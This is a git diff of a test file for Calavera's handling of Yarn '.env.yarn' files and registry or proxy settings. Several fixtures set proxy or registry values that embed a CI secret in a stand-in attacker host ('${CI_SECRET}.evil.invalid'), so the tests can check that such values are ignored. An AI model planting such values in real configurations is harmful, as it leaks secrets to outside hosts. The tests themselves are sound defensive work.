@@ -5,7 +5,7 @@ import { join } from "node:path";
 import test, { afterEach } from "node:test";
 import { inspect, promisify } from "node:util";
 
-import { detectLauncher, yarnParentCwd } from "../src/launcher-config.js";
+import { detectLauncher, yarnEnvironmentFiles, yarnParentCwd } from "../src/launcher-config.js";
 import { loadNpmRegistryOptions } from "../src/npm-config.js";
 import { removeTemporaryDirectories, temporaryDirectory } from "./temporary-directory.mjs";
 
@@ -43,7 +43,8 @@ async function fixture({ files = {}, env = {}, userAgent }) {
       HOME: home,
       ...(userAgent ? { npm_config_user_agent: userAgent } : {}),
       // Yarn passes the folder it started in to every binary and script it runs.
-      ...(userAgent === YARN ? { INIT_CWD: cwd } : {}),
+      // and the project folder it ran in as PROJECT_CWD.
+      ...(userAgent === YARN ? { INIT_CWD: cwd, PROJECT_CWD: cwd } : {}),
       ...env,
     },
   };
@@ -2070,32 +2071,130 @@ test("under Yarn, a backslash before an ordinary character stays in an injectEnv
   assert.equal((await loadNpmRegistryOptions(context)).options.proxy, undefined);
 });
 
-test("under Yarn, when Calavera cannot see the folder Yarn ran in and a .env.yarn may have been loaded, every variable is ignored, and the warning says why", async () => {
+test("under Yarn without /proc, every .env.yarn that Yarn could have read counts, and only the variables they set from a variable are ignored", async () => {
+  // `yarn workspace app ...` from the root: INIT_CWD is the workspace, and Yarn ran somewhere in
+  // the project, which Calavera cannot see, so the root's and every other project folder's
+  // .env.yarn count.
   const context = await fixture({
     userAgent: YARN,
     files: {
       "workspace/project/packages/app/package.json": "{}",
       "workspace/project/.env.yarn": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
+      "workspace/project/packages/other/.env.yarn":
+        "YARN_NPM_REGISTRY_SERVER=https://${CI_SECRET}.invalid\n",
     },
-    env: { YARN_HTTPS_PROXY: "http://caller.example.com:1" },
+    env: {
+      CI_SECRET,
+      YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1`,
+      YARN_NPM_REGISTRY_SERVER: `https://${CI_SECRET}.invalid`,
+      YARN_HTTP_PROXY: "http://caller.example.com:1",
+    },
   });
-  // `yarn workspace app ...` from the root: INIT_CWD is the workspace, Yarn ran in the root.
   const result = await loadNpmRegistryOptions({
     ...context,
     yarnProcessCwd: null,
     env: { ...context.env, INIT_CWD: join(context.cwd, "packages", "app") },
   });
   assert.equal(result.options.proxy, undefined);
-  assert.deepEqual(result.warnings, [
-    "Ignored YARN_HTTPS_PROXY: Calavera cannot tell which environment files Yarn loaded for this run, because it cannot see the folder Yarn ran in, which decides which .env.yarn Yarn read. List the file in injectEnvironmentFiles in the project's .yarnrc.yml, so Calavera can tell whether Yarn loaded it.",
-  ]);
-  // With no .env.yarn on either path, Yarn loaded nothing, and the caller's proxy applies.
-  const none = await fixture({
+  assert.equal(result.registry.origin, "https://registry.yarnpkg.com");
+  assert.equal(result.warnings.length, 2);
+  assert.match(
+    result.warnings[0],
+    /^Ignored YARN_HTTPS_PROXY, which \.env\.yarn sets from a variable/,
+  );
+  assertNoSecret(result, new RegExp(CI_SECRET));
+});
+
+test("under Yarn without /proc, a literal .env.yarn registry and a caller's own unrelated proxy both apply", async () => {
+  // A macOS-style run: Calavera cannot read Yarn's folder, but no candidate sets a value from a
+  // variable.
+  const context = await fixture({
     userAgent: YARN,
+    files: {
+      "workspace/project/.env.yarn":
+        "YARN_NPM_REGISTRY_SERVER=https://literal-mirror.example.com\n",
+    },
+    env: {
+      YARN_NPM_REGISTRY_SERVER: "https://literal-mirror.example.com",
+      YARN_HTTPS_PROXY: "http://caller.example.com:1",
+    },
+  });
+  const result = await loadNpmRegistryOptions({ ...context, yarnProcessCwd: null });
+  assert.equal(result.registry.origin, "https://literal-mirror.example.com");
+  assert.equal(result.options.proxy, "http://caller.example.com:1");
+  assert.deepEqual(result.warnings, []);
+});
+
+test("under Yarn without /proc, a .env.yarn above the project or above the folder Calavera started in counts, as after --cwd or yarn dlx", async () => {
+  // `yarn --cwd project ...` from the parent folder reads the parent's .env.yarn.
+  const above = await fixture({
+    userAgent: YARN,
+    files: { "workspace/.env.yarn": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n" },
+    env: { CI_SECRET, YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
+  });
+  assert.equal(
+    (await loadNpmRegistryOptions({ ...above, yarnProcessCwd: null })).options.proxy,
+    undefined,
+  );
+  // yarn dlx: PROJECT_CWD and INIT_CWD name the temporary project, and Yarn ran in the folder the
+  // binary runs in, where Calavera starts.
+  const dlx = await fixture({
+    userAgent: YARN,
+    files: {
+      "workspace/project/.env.yarn": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n",
+      "tmp/xfs-1a2b/dlx-4242/package.json": "{}\n",
+    },
+    env: { CI_SECRET, YARN_HTTPS_PROXY: `http://${CI_SECRET}.evil.invalid:1` },
+  });
+  const temporary = join(dlx.cwd, "..", "..", "tmp", "xfs-1a2b", "dlx-4242");
+  const result = await loadNpmRegistryOptions({
+    ...dlx,
+    yarnProcessCwd: null,
+    env: { ...dlx.env, INIT_CWD: temporary, PROJECT_CWD: temporary },
+  });
+  assert.equal(result.options.proxy, undefined);
+  // A sibling project outside every candidate is not judged.
+  const sibling = await fixture({
+    userAgent: YARN,
+    files: { "workspace/other/.env.yarn": "YARN_HTTPS_PROXY=http://${CI_SECRET}.evil.invalid:1\n" },
     env: { YARN_HTTPS_PROXY: "http://caller.example.com:1" },
   });
-  const empty = await loadNpmRegistryOptions({ ...none, yarnProcessCwd: null });
-  assert.equal(empty.options.proxy, "http://caller.example.com:1");
+  assert.equal(
+    (await loadNpmRegistryOptions({ ...sibling, yarnProcessCwd: null })).options.proxy,
+    "http://caller.example.com:1",
+  );
+});
+
+test("under Yarn without /proc, a candidate set that cannot be bounded makes every variable ignored, and the warning says why", async () => {
+  // Without PROJECT_CWD, Calavera does not know the project Yarn ran in.
+  const context = await fixture({
+    userAgent: YARN,
+    files: { "workspace/project/.env.yarn": "PLAIN=1\n" },
+    env: { YARN_HTTPS_PROXY: "http://caller.example.com:1" },
+  });
+  const { PROJECT_CWD: _projectCwd, ...env } = context.env;
+  const result = await loadNpmRegistryOptions({ ...context, env, yarnProcessCwd: null });
+  assert.equal(result.options.proxy, undefined);
+  assert.deepEqual(result.warnings, [
+    "Ignored YARN_HTTPS_PROXY: Calavera cannot tell which environment files Yarn loaded for this run, because it cannot see the folder Yarn ran in, and Yarn passed no PROJECT_CWD, so the folders Yarn could have run in are unknown. List the file in injectEnvironmentFiles in the project's .yarnrc.yml, so Calavera can tell whether Yarn loaded it.",
+  ]);
+  // A project with more folders than Calavera walks cannot be bounded either.
+  const large = await fixture({
+    userAgent: YARN,
+    files: { "workspace/project/a/b/c/d/.keep": "", "workspace/project/.env.yarn": "PLAIN=1\n" },
+  });
+  const files = await yarnEnvironmentFiles({
+    env: large.env,
+    startingCwd: large.cwd,
+    accountHome: large.accountHome,
+    cwd: large.cwd,
+    yarnProcessCwd: null,
+    folderLimit: 3,
+  });
+  assert.match(
+    files.undetermined?.reason ?? "",
+    /the project has more folders than Calavera searches/,
+  );
 });
 
 test("under Yarn, the folder Yarn ran in decides the default .env.yarn, also under --cwd or yarn workspace", async () => {
